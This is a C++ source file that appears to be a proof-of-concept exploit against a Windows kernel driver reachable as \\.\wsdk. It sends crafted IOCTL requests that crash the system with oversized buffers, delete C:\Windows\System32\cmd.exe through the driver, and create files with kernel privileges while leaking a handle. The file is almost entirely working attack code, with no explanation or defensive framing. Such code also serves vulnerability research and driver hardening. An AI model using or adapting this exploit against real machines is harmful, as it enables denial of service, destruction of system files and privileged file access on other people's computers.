#include <iostream>
#include <Windows.h>
#include <winioctl.h>

#define SymLinkName L"\\\\.\\wsdk"

HANDLE hDevice;

void BSOD_80002004()
{
    DWORD dwWrite;
    unsigned char data[0x10000];
    memset(data, 'a', 0x10000);
    while (1)
    {
        DeviceIoControl(hDevice, 0x80002004, data, 0x10000, NULL, 0, &dwWrite, NULL);
    }
}

void BSOD_80002008()
{
    DWORD dwWrite;
    unsigned char data[0x10000];
    memset(data, 'a', 0x10000);
    while (1)
    {
        DeviceIoControl(hDevice, 0x80002008, data, 0x10000, NULL, 0, &dwWrite, NULL);
    }
}

struct DATA_80002008
{
    int padding;
    WCHAR filename[0x100];
};

void DeleteFile_80002008()
{
    DWORD dwWrite;
    DATA_80002008 data;
    data.padding = 0;
    WCHAR filename[0x200] = L"\\??\\C:\\Windows\\System32\\cmd.exe\0";
    memset(data.filename, 0, 0x200);
    memcpy(data.filename, filename, 0x200);
    DeviceIoControl(hDevice, 0x80002008, &data, sizeof(data), NULL, 0, &dwWrite, NULL);
}

struct DATA_80002004
{
    int CreateOptions;    // 0: FILE_NON_DIRECTORY_FILE, other: FILE_DIRECTORY_FILE
    int Disposition;      // 0: FILE_SUPERSEDE, other: FILE_OPEN
    unsigned char padding[0x6c];
    WCHAR filename[0x100];
};

HANDLE CreateFile_80002004()
{
    DWORD dwWrite;
    DATA_80002004 data;
    data.CreateOptions = 0;
    data.Disposition = 1;
    memset(data.padding, 0, 0x6c);
    WCHAR filename[0x100] = L"\\??\\C:\\haha.txt\0";
    memcpy(data.filename, filename, 0x200);
    DeviceIoControl(hDevice, 0x80002004, &data, sizeof(data), &data, sizeof(data), &dwWrite, NULL);

    HANDLE fileHandle = (HANDLE)(((long long)(data.Disposition) << 32) + (long long)data.CreateOptions);
    printf("file handle: %llx\n", fileHandle);
    return fileHandle;
}

int main(int argc, char* argv[])
{
    hDevice = CreateFile(SymLinkName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_SYSTEM, 0);
    if (hDevice == INVALID_HANDLE_VALUE)
    {
        printf("Get Driver Handle Error with Win32 error code: %x\n", GetLastError());
        system("pause");
        return 0;
    }

    CreateFile_80002004();

    system("pause");
    return 0;
}
